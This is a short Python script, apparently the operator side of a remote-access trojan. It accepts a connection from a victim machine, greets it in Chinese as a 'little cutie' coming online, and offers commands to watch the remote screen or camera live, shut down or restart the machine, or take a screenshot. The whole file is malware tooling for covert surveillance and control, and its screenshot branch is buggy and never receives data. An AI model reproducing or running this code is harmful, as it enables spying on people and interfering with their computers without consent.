import socket,cv2,sys,time

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.bind(('0.0.0.0', 8080))
s.listen(5)

conn,addr = s.accept()

print(f"一个小可爱已上线{addr[0]}")

print("1.监视 2.关机 3.重启 4.截图 5.退出")

command = input()
conn.send(command.encode())
count = 0
if command == '1':
    while True:
        size = int(conn.recv(10).decode())     #修改 1024-》10
        cur_size = 0
        with open('te.jpg', 'wb') as f:
            while cur_size < size:
                data = conn.recv(2048)
                f.write(data)
                cur_size += len(data)
        img_cv = cv2.imread('te.jpg')
        cv2.imshow('test',img_cv)
        # time.sleep(0.5)
        key = cv2.waitKey(1) & 0xFF
        count += 1
        # if key == ord('q') or key == 10:    # 10是esc的ASCII码值
        #     break
    cv2.destroyAllWindows()
elif command == '4':
    size = int(conn.recv(10).decode())
    cur_size = 0
    while size < cur_size :
        with open('te.jpg', 'wb') as f:
            data = conn.recv(2048)
            f.write(data)
            cur_size += len(data)
elif command == '5':
    sys.exit(0)

conn.close()